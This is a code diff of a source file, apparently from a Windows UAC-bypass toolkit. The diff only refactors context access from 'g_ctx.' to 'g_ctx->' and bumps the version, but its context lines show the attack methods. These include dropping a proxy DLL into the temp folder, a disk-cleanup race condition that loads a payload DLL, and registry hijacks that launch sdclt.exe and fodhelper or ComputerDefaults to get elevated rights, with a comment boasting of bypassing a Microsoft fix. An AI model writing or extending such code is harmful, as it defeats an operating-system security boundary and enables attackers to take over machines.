@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.10
+*  VERSION:     3.11
 *
-*  DATE:        18 Nov 2018
+*  DATE:        23 Nov 2018
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -80,7 +80,7 @@ BOOL ucmHijackShellCommandMethod(
                 return FALSE;
             }
             RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            _strcpy(szBuffer, g_ctx.szTempDirectory);
+            _strcpy(szBuffer, g_ctx->szTempDirectory);
             _strcat(szBuffer, WDSCORE_DLL);
             //write proxy dll to disk
             if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
@@ -289,7 +289,7 @@ BOOL ucmDiskCleanupRaceCondition(
 
     g_EnigmaThreadCtx.PayloadDll = PayloadDll;
     g_EnigmaThreadCtx.PayloadDllSize = PayloadDllSize;
-    _strcpy(g_EnigmaThreadCtx.szTempDirectory, g_ctx.szTempDirectory);
+    _strcpy(g_EnigmaThreadCtx.szTempDirectory, g_ctx->szTempDirectory);
 
     hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmDiskCleanupWorkerThread, &g_EnigmaThreadCtx, 0, &ti);
     if (hThread) {
@@ -360,7 +360,7 @@ BOOL ucmAppPathMethod(
     // Some target applications may not exists in wow64 folder.
     //
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
     }
@@ -413,7 +413,7 @@ BOOL ucmAppPathMethod(
     // Reenable wow64 redirection if under wow64.
     //
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
@@ -456,7 +456,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
     WCHAR szOldValue[MAX_PATH + 1];
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
     }
@@ -478,7 +478,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
         // There is a fix of original concept in 16237 RS3.
         // Bypass it.
         //
-        if (g_ctx.dwBuildNumber >= 16237) {
+        if (g_ctx->dwBuildNumber >= 16237) {
             lpTargetValue = TEXT("");
         }
         else {
@@ -505,7 +505,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
-            _strcpy(szBuffer, g_ctx.szSystemDirectory);
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, SDCLT_EXE);
             bResult = supRunProcess(szBuffer, TEXT("/KICKOFFELEV"));
             if (bExist == FALSE) {
@@ -529,7 +529,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
         RegCloseKey(hKey);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
@@ -568,7 +568,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
     // Trigger application doesn't exist in wow64.
     //
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
 }
@@ -614,14 +614,14 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
-            _strcpy(szTempBuffer, g_ctx.szSystemDirectory);
+            _strcpy(szTempBuffer, g_ctx->szSystemDirectory);
 
             //
             // Not because it was fixed but because this was added in RS4 _additionaly_
             //
             lpTargetApp = FODHELPER_EXE;
 
-            if (g_ctx.dwBuildNumber > 16299) {
+            if (g_ctx->dwBuildNumber > 16299) {
 
                 if (IDYES == ucmShowQuestion(
                     TEXT("Would you like to use this method with ComputerDefaults.exe (YES) or Fodhelper.exe (NO)?")))
@@ -642,7 +642,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
         RegCloseKey(hKey);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
